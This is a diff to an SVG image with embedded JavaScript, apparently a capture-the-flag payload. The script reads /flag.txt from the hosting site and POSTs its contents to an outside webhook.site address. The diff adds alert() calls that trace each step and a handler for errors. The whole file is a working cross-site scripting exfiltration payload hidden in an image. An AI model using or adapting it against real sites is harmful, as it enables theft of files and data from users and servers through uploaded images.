@@ -1,13 +1,21 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
   <script type="text/javascript">
+    alert('Script started');
     fetch('/flag.txt')
-      .then(response => response.text())
+      .then(response => {
+        alert('Got response: ' + response.status);
+        return response.text();
+      })
       .then(data => {
+        alert('Got data: ' + data);
         fetch('https://webhook.site/582e502c-88ba-4c5a-9eda-2c2e1a3b289b', {
           method: 'POST',
           body: data
-        });
+        }).then(() => alert('Sent to webhook'));
+      })
+      .catch(error => {
+        alert('Error: ' + error);
       });
   </script>
 </svg> 
